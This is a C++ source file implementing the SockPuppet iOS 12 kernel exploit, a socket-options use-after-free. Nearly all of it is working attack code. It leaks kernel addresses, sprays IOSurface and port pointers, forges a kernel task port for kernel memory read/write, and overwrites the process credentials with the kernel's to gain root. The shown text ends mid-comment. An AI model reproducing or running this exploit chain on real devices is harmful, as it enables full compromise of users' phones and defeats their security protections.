//
//  SockPuppet.cpp
//
//  Created by Umang Raghuvanshi on 02/08/19.
//  Copyright © 2019 Umang Raghuvanshi. All rights reserved. Licensed under the
//  BSD 3-clause license.

// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
// 1. Redistributions of source code must retain the above copyright notice,
// this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
// 3. Neither the name of the copyright holder nor the names of its contributors
// may be used to endorse or promote products derived from this software without
// specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT
// HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
// INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
// LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,
// OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
// LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
// NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
// EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#include "SockPuppet.hpp"
#import "Utility.hpp"
#include <sys/sysctl.h>
#include <stdio.h>
#include <pthread.h>
#include "kernel_call.h"
#define MAX_ATTEMPTS 200000
#define IPV6_USE_MIN_MTU 42
#define IPV6_PKTINFO 46
#define IPV6_PREFER_TEMPADDR 63

extern "C" {
    //#include "../Include/External/iosurface.h"
#include "iosurface.h"
//#include "electra_objc.h"

#include "kernel_memorySP.h"
#include "common.h"
//#include "ViewController.h"
    //#import "kernel_memory.h"
}


#include <vector>
//extern mach_port_t tfpzero_s3;

extern uint64_t mytaskselfpre_s3;

uint64_t newIOSURFACEROOTUSERCLIENT_port_SP_s3;
mach_port_t newClientSP_s3;
mach_port_t tfpSP0_s3;
uint64_t my_s3_ipcSpaceKernel_s3;
uint64_t ourtaskSP_s3;
uint64_t struct_task_SP_s3;

uint64_t kern_ucredSP_s3;
uint64_t orig_ucredSP_s3;
uint64_t SP_task_ipc_spaceKERNEL_SP_s3;
uint64_t new_SP_task_port_kaddr_s3;
extern uint64_t kernel_base_EXPORTED_SP_s3;
uint64_t exported_itk_space_SP_s3;
uint64_t selfprocSP_s3;
uint64_t keep_port_task_s3;

//uint64_t current_task_s3_s3;
uint64_t self_port_addr_s3;
uint64_t kern_task_addr_s3;



// MARK: - Functions

extern "C" {
    kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
    kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
    kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
    kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);;
    kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);

}
// MARK: UAF helpers

namespace Exploits {
    namespace SockPuppetSupport {
        class Socket {
            const int descriptor;

        public:
            Socket() : descriptor(socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP)) {
                // Create the socket we'll use for the UAF.
                if (descriptor < 0) throw std::runtime_error("Failed to create a socket");

                // Allow setting options even socket is closed.
                struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT,
                    .npx_mask = SONPX_SETOPTSHUT};
                if (setsockopt(descriptor, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx,
                               sizeof(sonpx)) != 0)
                    throw std::runtime_error("Failed to set SO_NP_EXTENSIONS");
            }

            Socket(const Socket &other) = delete;

            int getMinMtu() {
                int minmtu;
                socklen_t sz = sizeof(minmtu);
                if (getsockopt(descriptor, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, &sz) !=
                    0)
                    throw std::runtime_error("getsockopt failed");

                return minmtu;
            }

            void setMinMtu(int *minmtu) {
                if (setsockopt(descriptor, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu,
                               sizeof(*minmtu)) != 0)
                    throw std::runtime_error("setsockopt failed");
            }

            int getPreferTempAddr() {
                int prefertempaddr;
                socklen_t sz = sizeof(prefertempaddr);
                if (getsockopt(descriptor, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR,
                               &prefertempaddr, &sz) != 0)
                    throw std::runtime_error("getsockopt failed");

                return prefertempaddr;
            }

            std::unique_ptr<uint8_t[]> getPktInfo() {
                std::unique_ptr<uint8_t[]> buf(new uint8_t[sizeof(in6_pktinfo)]);
                socklen_t sz = sizeof(in6_pktinfo);

                if (getsockopt(descriptor, IPPROTO_IPV6, IPV6_PKTINFO, buf.get(), &sz) != 0)
                    throw std::runtime_error("getsockopt failed");

                return buf;
            }

            void setPktInfo(void *pktinfo) {
                if (setsockopt(descriptor, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo,
                               sizeof(struct in6_pktinfo)) != 0)
                    throw std::runtime_error("setsockopt failed");
            }

            //! This is the bug trigger — the options for the socket will now dangle in
            //! the kernel's address space.
            void dangle() {
                int minmtu = -1;
                setMinMtu(&minmtu);
                if (disconnectx(descriptor, 0, 0) != 0)
                    throw std::runtime_error("disconnectx failed");
            }

            ~Socket() {
                if (descriptor > 0) close(descriptor);
            }
        };

        typedef ssize_t (*read_t)(int fildes, void *buf, size_t nbyte);
        read_t libc_read = read;
        typedef ssize_t (*write_t)(int fildes, const void *buf, size_t nbyte);
        write_t libc_write = write;

        class Pipe {
            int fds[2];

        public:
            Pipe() {
                if (pipe(fds) != KERN_SUCCESS)
                    throw std::runtime_error("Failed to create a pipe");
            }

            Pipe(const Pipe &other) = delete;

            int getReadDescriptor() const { return fds[0]; };
            int getWriteDescriptor() const { return fds[1]; };

            size_t read(void *buf, size_t sz, bool balance = false) const {
                ssize_t numRead;
                if ((numRead = libc_read(getReadDescriptor(), buf, sz)) < 0)
                    throw std::runtime_error("Failed to read from pipe");

                if (balance &&
                    libc_write(getWriteDescriptor(), buf, static_cast<size_t>(numRead)) < 0)
                    throw std::runtime_error("Balancing write failed");

                return static_cast<size_t>(numRead);
            }

            size_t write(void *buf, size_t sz, bool balance = false) const {
                ssize_t numWritten;
                if ((numWritten = libc_write(getWriteDescriptor(), buf, sz)) < 0)
                    throw std::runtime_error("Failed to write to pipe");

                if (balance && libc_read(getReadDescriptor(), buf,
                                         static_cast<size_t>(numWritten)) < 0)
                    throw std::runtime_error("Balancing read failed");

                return static_cast<size_t>(numWritten);
            }

            ~Pipe() {
                close(fds[0]);
                close(fds[1]);
            }
        };
    }  // namespace SockPuppetSupport
}  // namespace Exploits

using namespace Exploits::SockPuppetSupport;

static inline uint32_t mach_port_waitq_flags() {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type = WQT_QUEUE;
    waitq_flags.waitq_fifo = 1;
    waitq_flags.waitq_prepost = 0;
    waitq_flags.waitq_irq = 0;
    waitq_flags.waitq_isvalid = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

using namespace Exploits;

uint64_t SockPuppet::leakPipeBufferAddress(int fd, uint64_t *bufferptr) {
    auto const proc = earlyRead64(
                                  currentTaskAddr + m_parameters.get(StructureOffset::Task_BSDInfo));

    auto const fds =
    earlyRead64(proc + m_parameters.get(StructureOffset::Proc_PFD));
    auto const ofiles =
    earlyRead64(fds + m_parameters.get(FileDescriptor_FDOfiles));
    auto const fproc = earlyRead64(ofiles + fd * 8);
    auto const fglob = earlyRead64(fproc + m_parameters.get(FileProc_FGlob));
    auto const fgdata =
    earlyRead64(fglob + m_parameters.get(StructureOffset::FileGlob_FGData));
    if (bufferptr)
        *bufferptr = fgdata + m_parameters.get(StructureOffset::FGData_PipeBuffer);

    return earlyRead64(fgdata +
                       m_parameters.get(StructureOffset::FGData_PipeBuffer));
}

uint64_t SockPuppet::leakPortAddress(mach_port_t portname) {
    Socket socket;
    socket.dangle();
    uint64_t ptr;
    #if __arm64e__
        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            // Options are 192 bytes long, so we must spray 192/sizeof(ptr) pointers to
            // the current port.
            mach_port_t holder = Utility::sprayPortPointer(
                                                           portname, 192 / sizeof(size_t), MACH_MSG_TYPE_COPY_SEND);
            const int mtu = socket.getMinMtu();
            const int preferTempAddr = socket.getPreferTempAddr();

            if (mtu < 0xffffff00 || mtu == 0xffffffff || preferTempAddr == 0xdeadbeef ||
                preferTempAddr == 0) {
                mach_port_destroy(mach_task_self(), holder);
                continue;
            }

            ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) |
            ((uint64_t)preferTempAddr & 0x00000000ffffffff);

            mach_port_destroy(mach_task_self(), holder);
            if(ptr == 0){
                printf("Failed to leak port address\n");
                //run3();
                //soshitexit();
            }
            printf("ptr address: 0x%llx\n", ptr);

            return ptr;
        }
        printf("Failed to leak port address\n");
        exit(1);
    #else
        for (int i = 0; i < MAX_ATTEMPTS; i++) {
            // Options are 192 bytes long, so we must spray 192/sizeof(ptr) pointers to
            // the current port.
            mach_port_t holder = Utility::sprayPortPointer(
                                                           portname, 192 / sizeof(size_t), MACH_MSG_TYPE_COPY_SEND);
            const int mtu = socket.getMinMtu();
            const int preferTempAddr = socket.getPreferTempAddr();

            if (mtu < 0xffffff00 || mtu == 0xffffffff || preferTempAddr == 0xdeadbeef ||
                preferTempAddr == 0) {
                mach_port_destroy(mach_task_self(), holder);
                continue;
            }

            ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) |
            ((uint64_t)preferTempAddr & 0x00000000ffffffff);

            mach_port_destroy(mach_task_self(), holder);
            if(ptr == 0){
                printf("Failed to leak port address\n");
                //run3();
                //soshitexit();
            }
            printf("ptr address: 0x%llx\n", ptr);

            return ptr;
        }
        printf("Failed to leak port address\n");
        exit(1);
    #endif
    

}

std::unique_ptr<uint8_t[]> SockPuppet::leak20AndFree(uint64_t address,
                                                     bool free) {
    // Create a bunch of sockets with dangling options.
    std::vector<Socket> socketsWithDanglingOptions(128);
    struct ip6_pktopts fakeOptions = {0};
    fakeOptions.ip6po_minmtu = 0xcafebabe;
    fakeOptions.ip6po_pktinfo = (struct in6_pktinfo *)address;
    for (auto &s : socketsWithDanglingOptions) s.dangle();

    while (true) {
        IOSurface_init();
        if (!IOSurface_spray_with_gc(32, 256, &fakeOptions, sizeof(fakeOptions),
                                     NULL))
            throw std::runtime_error("IOSurface spray failed");

        for (auto &s : socketsWithDanglingOptions) {
            if (s.getMinMtu() == 0xcafebabe) {
                std::unique_ptr<uint8_t[]> buf = s.getPktInfo();
                if (free) {
                    in6_pktinfo nullPktInfo = {0};
                    s.setPktInfo((void *)&nullPktInfo);
                }

                IOSurface_deinit();
                return buf;
            }
        }
        IOSurface_deinit();
    }
}

uint64_t SockPuppet::earlyRead64(uint64_t address) {
    std::unique_ptr<uint8_t[]> buf = leak20AndFree(address);
    auto u64 = *(uint64_t *)buf.get();
    return u64;
}

static inline uint32_t stage1Read32(Pipe &pipe, mach_port_t fakeTask,
                                    uint64_t addr, const Parameters &params) {
    uint8_t buffer[sizeof(kport_t) + sizeof(ktask_t)];
    if (pipe.read(buffer, sizeof(buffer)) != sizeof(buffer))
        throw std::runtime_error("Pipe read failed");

    *(uint64_t *)((uint64_t)buffer + sizeof(kport_t) +
                  params.get(StructureOffset::Task_BSDInfo)) =
    addr - params.get(StructureOffset::Proc_PPID);

    if (pipe.write(buffer, sizeof(buffer)) != sizeof(buffer))
        throw std::runtime_error("Pipe buffer write failure");

    int pid;
    pid_for_task(fakeTask, &pid);
    return static_cast<uint32_t>(pid);
}

static inline uint64_t stage1Read64(Pipe &pipe, mach_port_t fakeTask,
                                    uint64_t addr, const Parameters &params) {
    uint64_t high = stage1Read32(pipe, fakeTask, addr + 0x4, params);
    uint32_t low = stage1Read32(pipe, fakeTask, addr, params);
    return (high << 32) | low;
}

static inline uint64_t rk64SP(task_t vmMap, uint64_t addr) {
    uint64_t data, size;
    if (mach_vm_read_overwrite(vmMap, (mach_vm_address_t)addr,
                               (mach_vm_size_t)sizeof(data),
                               (mach_vm_address_t)&data, &size) != KERN_SUCCESS ||
        size != sizeof(data))
        throw std::runtime_error("read64 failed");
    return data;
}

static inline void wk64SP(task_t vmMap, uint64_t addr, uint64_t val) {
    if ((mach_vm_write(vmMap, (mach_vm_address_t)addr, (vm_offset_t)&val, 8)) !=
        KERN_SUCCESS)
        throw std::runtime_error("write64 failed");
}

static inline void wk32SP(task_t vmMap, uint64_t addr, uint32_t val) {
    if ((mach_vm_write(vmMap, (mach_vm_address_t)addr, (vm_offset_t)&val, 4)) !=
        KERN_SUCCESS)
        throw std::runtime_error("write32 failed");
}

static inline uint64_t lookupPort(task_t vmMap, uint64_t currentTask,
                                  mach_port_t target, const Parameters &params,
                                  bool null = false) {
    const uint64_t itkSpace = rk64SP(vmMap, currentTask + params.get(Task_ITKSpace));
    itk_space_s3 = itkSpace;
    const uint64_t isTable = rk64SP(vmMap, itkSpace + params.get(IPCSpace_ISTable));
    itk_space_istable_s3 = isTable;
    const uint32_t idx = target >> 8;
    const uint64_t portAddr = rk64SP(vmMap, isTable + (idx * params.get(IPCSpace_ISTableSize)));
    itk_space_port_s3 = portAddr;
    if (null) {
        wk64SP(vmMap, isTable + (idx * params.get(IPCSpace_ISTableSize)), 0);
        wk32SP(vmMap, isTable + (idx * params.get(IPCSpace_ISTableSize)) + 8, 0);
    }

    return portAddr;
}

SockPuppet::SockPuppet(const HostInfo &hostInfo, const Parameters &parameters)
: KernelExploit(hostInfo, parameters) {}

bool SockPuppet::isCompatible() const {
    const int version = m_hostInfo.integerVersion();
    return (version < Versions::k12_3 && version >= Versions::k12_0) ||
    version == Versions::k12_4;
}

bool SockPuppet::canRerun() const { return true; }

bool SockPuppet::canReturnFakeTFP0() const { return true; }

bool SockPuppet::run3() {
    info("Running the SockPuppet exploit");

    uint64_t ownTaskPortKaddr = leakPortAddress(mach_task_self());
    printf("leaked port address\n");
    if (ownTaskPortKaddr == 0){
       // run3();
        sleep(1);
        exit(1);
    }
    ourtaskSP_s3 = ownTaskPortKaddr;
    currentTaskAddr = earlyRead64(ownTaskPortKaddr + m_parameters.get(StructureOffset::IPCPort_IPKObject));
    printf("Current task: %p\n", currentTaskAddr);
    current_task_s3_s3 = currentTaskAddr;
    uint64_t ipcSpaceKernel = earlyRead64(ownTaskPortKaddr + m_parameters.get(IPCPort_IPReceiver));
    printf("Kernel's IPC space: %p\n", ipcSpaceKernel);
    if (ipcSpaceKernel == 0){
       // run3();
        sleep(1);
        exit(1);
    }
    my_s3_ipcSpaceKernel_s3 = ipcSpaceKernel;
    //m_progress += 5;

    Pipe portPointerOverwritePipe, fakePortPipe;

    uint8_t pipebuf[0x10000] = {0};
    // Force allocation.
    portPointerOverwritePipe.write(pipebuf, sizeof(pipebuf), true);
    portPointerOverwritePipe.write(pipebuf, 8);

    auto const fakeSize = sizeof(kport_t) + sizeof(ktask_t);
    char portAndTaskBuffer[fakeSize] = {0};
    auto fakePort = (kport_t *)portAndTaskBuffer;
    auto fakeTask = (ktask_t *)((uint8_t *)fakePort + sizeof(kport_t));

    fakeTask->ref_count = 0xff;

    fakePort->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
    fakePort->ip_references = 0xf00d;
    fakePort->ip_lock.type = 0x11;
    fakePort->ip_messages.port.receiver_name = 1;
    fakePort->ip_messages.port.msgcount = 0;
    fakePort->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
    fakePort->ip_messages.port.waitq.flags = mach_port_waitq_flags();
    fakePort->ip_srights = 99;
    fakePort->ip_receiver = ipcSpaceKernel;

    fakePortPipe.write((void *)fakePort, fakeSize, true);
    uint64_t pipePtr;

    uint64_t portPointerOverwritePipeKaddr = leakPipeBufferAddress(
                                                                   portPointerOverwritePipe.getReadDescriptor(), &pipePtr);
    uint64_t fakePortBufferKaddr =
    leakPipeBufferAddress(fakePortPipe.getReadDescriptor());
    if (fakePortBufferKaddr == 0){
       // run3();
        sleep(1);
        exit(1);
    }
    debug("Pipe buffer %i: %p", portPointerOverwritePipe.getReadDescriptor(),
          portPointerOverwritePipeKaddr);
    debug("Pipe buffer %i: %p", fakePortPipe.getReadDescriptor(),
          fakePortBufferKaddr);

    // Fix ip_kobject.
    fakePort->ip_kobject = fakePortBufferKaddr + sizeof(kport_t);
    fakePortPipe.write((void *)fakePort, fakeSize);

    mach_port_t dummyKernelTaskPort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                       &dummyKernelTaskPort);
    if (!MACH_PORT_VALID(dummyKernelTaskPort) ||
        mach_port_insert_right(mach_task_self(), dummyKernelTaskPort,
                               dummyKernelTaskPort,
                               MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS)
        throw std::runtime_error("tfp0 allocation failed");
    const uint64_t tfp0Kaddr = leakPortAddress(dummyKernelTaskPort);
    debug("Dummy kernel task port: %p", tfp0Kaddr);
    //m_progress += 20;

    // Free the first pipe.
    leak20AndFree(portPointerOverwritePipeKaddr, true);
    mach_port_t holder = MACH_PORT_NULL;
    uint64_t leak = 0;
    for (int i = 0; i < MAX_ATTEMPTS; i++) {
        // Spray 0x10000/8 port pointers so that they get reallocated in place of
        // the first pipe.
        holder = Utility::sprayPortPointer(dummyKernelTaskPort, 0x10000 / 8,
                                           MACH_MSG_TYPE_COPY_SEND);
        portPointerOverwritePipe.read(&leak, sizeof(leak), true);

        if (leak == tfp0Kaddr) break;
        mach_port_destroy(mach_task_self(), holder);
    }
    if (leak != tfp0Kaddr) throw std::runtime_error("Failed to reallocate");

    //m_progress += 30;
    portPointerOverwritePipe.write(&fakePortBufferKaddr,
                                   sizeof(fakePortBufferKaddr));
    debug("Port pointer overwritten");

    char sendRightBuffer[0x1000] = {0};
    auto fakePortSendRightMsg = (struct ool_msg *)sendRightBuffer;
    const kern_return_t didRecv =
    mach_msg(&fakePortSendRightMsg->hdr, MACH_RCV_MSG, 0, 0x1000, holder,
             MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (didRecv != KERN_SUCCESS)
        throw std::runtime_error("Failed to recieve send rights to fake port");

    mach_port_t pipeFakeKernelTaskPort =
    ((mach_port_t *)fakePortSendRightMsg->ool_ports.address)[1];
    if (!MACH_PORT_VALID(pipeFakeKernelTaskPort) ||
        pipeFakeKernelTaskPort == dummyKernelTaskPort)
        throw std::runtime_error("Fake kernel task port is invalid");

    uint64_t structTask = stage1Read64(
                                       fakePortPipe, pipeFakeKernelTaskPort,
                                       ownTaskPortKaddr + m_parameters.get(StructureOffset::IPCPort_IPKObject),
                                       m_parameters);
    if (structTask != currentTaskAddr)
        throw std::runtime_error("Stage 1 read64 failed");
    debug("Stage 1 read64 succeeded");
    if (structTask == 0){
       // run3();
        sleep(1);
        exit(1);
    }
    uint64_t kernelVMMap = 0;
    while (structTask) {
        uint64_t bsdInfo = stage1Read64(
                                        fakePortPipe, pipeFakeKernelTaskPort,
                                        structTask + m_parameters.get(StructureOffset::Task_BSDInfo),
                                        m_parameters);
        if (!bsdInfo) throw std::runtime_error("Stage 1 read64 failed");

        uint32_t pid = stage1Read32(
                                    fakePortPipe, pipeFakeKernelTaskPort,
                                    bsdInfo + m_parameters.get(StructureOffset::Proc_PPID), m_parameters);
        if (pid == 0) {
            kernelVMMap =
            stage1Read64(fakePortPipe, pipeFakeKernelTaskPort,
                         structTask + m_parameters.get(Task_VMMap), m_parameters);
            if (!kernelVMMap) throw std::runtime_error("Stage 1 read64 failed");
            break;
        }
        structTask =
        stage1Read64(fakePortPipe, pipeFakeKernelTaskPort,
                     structTask + m_parameters.get(Task_Prev), m_parameters);
    }
    if (!kernelVMMap) throw std::runtime_error("Failed to find kernel's VM map");
    debug("Kernel VM map: %p", kernelVMMap);

    fakePortPipe.read((void *)fakePort, fakeSize);
    fakeTask->lock.data = 0;
    fakeTask->lock.type = 0x22;
    fakeTask->ref_count = 0xff;
    fakeTask->active = 1;
    fakeTask->map = kernelVMMap;
    *(uint32_t *)((uint64_t)fakeTask + m_parameters.get(Task_ITKSelf)) = 1;
    fakePortPipe.write((void *)fakePort, fakeSize);

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
                       &kernelTaskPort);
    if (!MACH_PORT_VALID(kernelTaskPort) ||
        mach_port_insert_right(mach_task_self(), kernelTaskPort, kernelTaskPort,
                               MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS)
        throw std::runtime_error("tfp0 allocation failed");

    uint64_t stableFakeTask;
    if (mach_vm_allocate(pipeFakeKernelTaskPort, &stableFakeTask, sizeof(ktask_t),
                         VM_FLAGS_ANYWHERE) != KERN_SUCCESS)
        throw std::runtime_error("Failed to allocate memory for the fake task");
    if (mach_vm_write(pipeFakeKernelTaskPort, stableFakeTask,
                      (vm_offset_t)fakeTask, sizeof(ktask_t)) != KERN_SUCCESS)
        throw std::runtime_error("Failed to write fake task to kernel memory");

    const uint64_t kernelTaskPortKaddr = lookupPort(
                                                    pipeFakeKernelTaskPort, currentTaskAddr, kernelTaskPort, m_parameters);
    debug("Stable kernel task port %i: %p", kernelTaskPort, kernelTaskPortKaddr);
    fakePort->ip_kobject = stableFakeTask;
    if (mach_vm_write(pipeFakeKernelTaskPort, kernelTaskPortKaddr,
                      (vm_offset_t)fakePort, sizeof(kport_t)) != KERN_SUCCESS)
        throw std::runtime_error(
                                 "Failed to write fake kernel task port to kernel memory");

    uint64_t testAllocKaddr;
    if (mach_vm_allocate(kernelTaskPort, &testAllocKaddr, 8, VM_FLAGS_ANYWHERE) !=
        KERN_SUCCESS) {
        throw std::runtime_error("Stable task port isn't working");
    }
    mach_vm_deallocate(kernelTaskPort, testAllocKaddr, 8);

    info("Exploit succeeded, cleaning up");
    wk64SP(kernelTaskPort, pipePtr, 0);

    info("cleaning up pipe port");

    // Clean up the port living inside the pipe.
    lookupPort(kernelTaskPort, currentTaskAddr, pipeFakeKernelTaskPort,
               m_parameters, true);

    info("Cleanup done");
    
    mach_port_t run334me = getFakeKernelTaskPort();
    //prepare_for_rw_with_fake_tfp0(run334me);
    
    init_kernel_memorySP(run334me);
    
    // clean up port
    uint64_t task_addr = current_task_s3_s3;//rk64SP(self_port_addr + koffsetS3(<#enum kernel_offsetS3 offset#>)(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = itk_space_s3;//rk64SP(task_addr + SPkoffset(SPKSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = itk_space_istable_s3;//rk64SP(itk_space + SPkoffset(SPKSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    // clean up port
    uint64_t mytaskselfpre;
    uint64_t task_addr_SP;
    
    int pid = getpid();
    printf("[*] task_addr_SP: 0x%llx\n", task_addr_SP);
//        printf("[*] keep_port_task: 0x%llx\n", keep_port_task);
    kern_return_t retK = KERN_SUCCESS;
    
    io_connect_t client = MACH_PORT_NULL;
    mach_vm_size_t pagesize = 0;
    
    host_t host = HOST_NULL;
    host_t original_host = HOST_NULL;
    thread_t thread = THREAD_NULL;
    /********** ********** data hunting ********** **********/
    host = mach_host_self();
    original_host = host;
    thread = mach_thread_self();
    vm_size_t pgsz = 0;
    retK = _host_page_size(host, &pgsz);
    pagesize = pgsz;
    printf("page size: 0x%llx, %s\n", pagesize, mach_error_string(retK));
    if (retK != KERN_SUCCESS)
    {
        printf("failed to get page size! ret: %x %s\n", retK, mach_error_string(retK));
        //goto out;
    }
    
    io_service_t serviceIOSR = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(serviceIOSR))
    {
        printf("failed to find IOSurfaceRoot service\n");
        retK = KERN_FAILURE;
        //goto out;
    }
    printf("serviceIOSR: %x\n", serviceIOSR);
    
    retK = IOServiceOpen(serviceIOSR, mach_task_self(), 0, &client);
    printf("client: %x, %s\n", client, mach_error_string(retK));
    if (retK != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        printf("failed to open an IOSurface client: %x (%s)\n", retK, mach_error_string(retK));
        //goto out;
    }

    //leakPortAddress(mach_task_self());
    uint64_t iosruc_port = 0x0;

    iosruc_port = find_port_SP(client, ourtaskSP_s3);
    printf("[*] IOSurfaceRootUserClient port! = 0x%06llx\n", iosruc_port);
 
    uint64_t iosruc_addr = 0x0;
    iosruc_addr = rk64SP(iosruc_port + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); //offsetof(kport_t, ip_kobject), iosruc_addr);
    printf("iosruc_addr off 1: 0x%llx\n", iosruc_addr);
    uint64_t iosruc_vtab = 0x0;
    iosruc_vtab = rk64SP(iosruc_addr + 0x0);
    printf("iosruc_vtab: 0x%llx\n", iosruc_vtab);
    uint64_t iosruc_port_kernel = 0x0;
    iosruc_port_kernel = rk64SP(iosruc_port + koffsetS3(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));// OFFSET(ipc_port, ip_receiver));
    printf("[*] IOSurfaceRootUserClient iosruc_port_kernel port! = 0x%06llx\n", iosruc_port_kernel);

    SP_task_ipc_spaceKERNEL_SP_s3 = my_s3_ipcSpaceKernel_s3;
    printf("[*] SP_task_ipc_spaceKERNEL_SP  = 0x%06llx\n",SP_task_ipc_spaceKERNEL_SP_s3);
    printf("[*] itk_space_SP  = 0x%llx\n",itk_space_s3);
    

    uint64_t task_addr_SP_s3 = task_addr;
    //new_SP_task_port_kaddr_s3 = task_addr_SP_s3;
    //printf("[*] new_SP_task_port_kaddr! = 0x%llx\n", new_SP_task_port_kaddr_s3);
    printf("[*] self_port_addr? = 0x%llx\n",self_port_addr_s3);
    printf("[*] task_addrSP  = 0x%llx\n",(uint64_t)task_addr_SP_s3);
    printf("[*] IOSurfaceRootUserClient addr! = 0x%llx\n", iosruc_addr);
    printf("[*] IOSurfaceRootUserClient_ye_SP my new client  = 0x%x\n", newClientSP_s3);
    printf("[*] task_addr_SP is now rk64 of JustOurTask = 0x%llx\n", task_addr_SP_s3);
//task_self_addrSP = task_addr_SP;

    newIOSURFACEROOTUSERCLIENT_port_SP_s3 = iosruc_port;
    printf("[*] new_SP_task_port_kaddr struct_task  = 0x%llx\n",new_SP_task_port_kaddr_s3);
    selfprocSP_s3 = rk64SP(current_task_s3_s3 + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));
    printf("[*] selfproc?: 0x%llx\n", selfprocSP_s3);
    ourtaskSP_s3 = rk64SP(selfprocSP_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_TASK));// KSTRUCT_OFFSET_PROC_TASK);
    printf("[*] got ourtask addr taskport ?: 0x%llx\n", ourtaskSP_s3);
    ourprocFinal_s3 = rk64SP(task_addr_SP_s3 + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));//rk64SP(task_addr_SP + koffsetS3(KSTRUCT_OFFSET_TASK_BSD_INFO));//
    printf("[*] got ourprocFinal: 0x%llx\n", ourprocFinal_s3);
    // find kernproc by looping linked list
    kernprocFinal_s3 = ourprocFinal_s3;
    while (kernprocFinal_s3 != 0x0){
        uint32_t found_pid = 0x0;
        found_pid = rk32SP(kernprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_PID));
        if (found_pid == 0){
            printf("[*] got kernprocFinal: 0x%llx\n", kernprocFinal_s3);
            break;
        }
        kernprocFinal_s3 = rk64SP(kernprocFinal_s3 + 0x0);//kernproc will always be at the start of the linked list, so we loop backwards in order to find it
    }
    if (kernprocFinal_s3 == 0x0){
        printf("failed to find kernproc\n");
    }
    printf("[*] got kernproc: 0x%llx\n", kernprocFinal_s3);

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    // eleveate creds to kernel
    int elevateRet;
    int orig_uid = getuid();
    
    uint64_t orig_ucred_s3 = rk64SP(ourprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED));
    if (orig_ucred_s3 == 0x0)
    {
        printf("failed to get orig_ucred\n!");
        //goto out;
    }
    printf("orig_ucred: 0x%llx\n", orig_ucred_s3);
    
    uint64_t kern_ucred_s3 = rk64SP(kernprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED));
    if (kern_ucred_s3 == 0x0)
    {
        printf("failed to get kern_ucred!\n");
        elevateRet = KERN_FAILURE;
        //goto out;
    }
    printf("kern_ucred: 0x%llx\n", kern_ucred_s3);
    
    wk64SP(ourprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED), kern_ucred_s3);
    printf("setuid: %d, uid: %d\n", setuid(0), getuid());
    if (getuid() != 0)
    {
        printf("failed to elevate to root/kernel creds!\n");
        elevateRet = KERN_FAILURE;
    }
    
    host = mach_host_self();
    mach_port_t hsp4;
    elevateRet = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
    mach_port_deallocate(mach_host_self(), host);
    host = original_host;
    
    /* de-elevate
    
    wk64SP(ourprocFinal_s3 + koffsetS3(KSTRUCT_OFFSET_PROC_UCRED), orig_ucred_s3);
    
